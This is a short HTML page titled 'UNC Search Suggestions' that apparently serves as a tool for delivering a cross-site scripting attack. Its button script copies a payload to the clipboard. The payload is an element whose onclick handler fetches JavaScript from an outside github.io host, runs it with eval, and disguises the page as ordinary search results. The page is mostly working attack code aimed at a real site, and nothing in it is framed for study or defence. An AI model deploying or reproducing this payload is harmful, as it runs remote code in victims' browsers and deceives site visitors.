<!DOCTYPE HTML>
<html>
  <head>
    <title>UNC Search Suggestions</title>
  </head>
  <body>
    <button id="htmlInject">HTML Inject</button>
    <script>
      async function copyToClipboard(text) {
        try {
          await navigator.clipboard.writeText(text);
          console.log('Text copied to clipboard');
        } catch (err) {
          console.error('Failed to copy text: ', err);
        }
      }
      document.getElementById("htmlInject").addEventListener("click", copyToClipboard(`<x onclick="fetch('https://tebothegebo.github.io/unc-xss/htmlInject.js').then(r => r.text()).then(eval); document.title='You searched for Events'; document.getElementsByClassName('page-header')[0].childNodes[1].innerText = 'Search Results for Events'">Events`));
    </script>
  </body>
</html>
